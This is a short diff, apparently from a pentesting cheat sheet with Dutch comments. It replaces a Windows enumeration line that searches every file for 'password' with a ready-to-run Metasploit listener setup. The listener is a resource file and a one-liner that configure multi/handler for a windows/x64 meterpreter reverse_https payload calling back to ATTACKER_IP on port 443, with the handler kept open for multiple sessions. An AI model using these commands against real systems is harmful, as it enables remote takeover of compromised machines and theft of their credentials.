@@ -1,1 +1,14 @@
-syteminfo && set && findstr /spin "password" *.*
+# Metasploit Handler - Meterpreter Reverse HTTPS (snelle start)
+# Resource file aanmaken en laden voor snelle setup
+# handler.rc aanmaken:
+echo 'use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST ATTACKER_IP
+set LPORT 443
+set ExitOnSession false
+run -j' > /tmp/handler.rc
+msfconsole -q -r /tmp/handler.rc
+# Of als one-liner:
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST ATTACKER_IP; set LPORT 443; run -j"
+# Tip: Resource files zijn handig bij herhaaldelijk opzetten
+# Tip: ExitOnSession false → meerdere callbacks opvangen
